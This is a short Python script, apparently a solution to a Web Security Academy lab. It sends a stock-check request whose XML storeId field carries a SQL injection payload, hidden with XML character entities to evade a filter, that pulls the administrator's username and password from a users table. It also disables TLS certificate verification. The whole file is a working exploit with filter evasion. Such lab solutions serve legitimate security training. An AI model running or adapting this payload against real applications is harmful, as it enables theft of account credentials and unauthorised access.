import http.client
import ssl

LAB_ID = "???"


def POST_product_stock() -> http.client.HTTPResponse:
    method, path = 'POST', '/product/stock'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.5',
        'referer': f'https://{LAB_ID}.web-security-academy.net/product?productId=2',
        'content-type': 'application/xml',
        'origin': f'https://{LAB_ID}.web-security-academy.net',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'priority': 'u=1',
        'te': 'trailers',
    }
    body = '<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>2</productId><storeId>3 &#117;nion &#x53;elect username || &#39;~&#39; || password from users where username=&#39;administrator&#39;&#45;&#45;&#32;</storeId></stockCheck>'
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


print(POST_product_stock().read().decode('utf-8'))
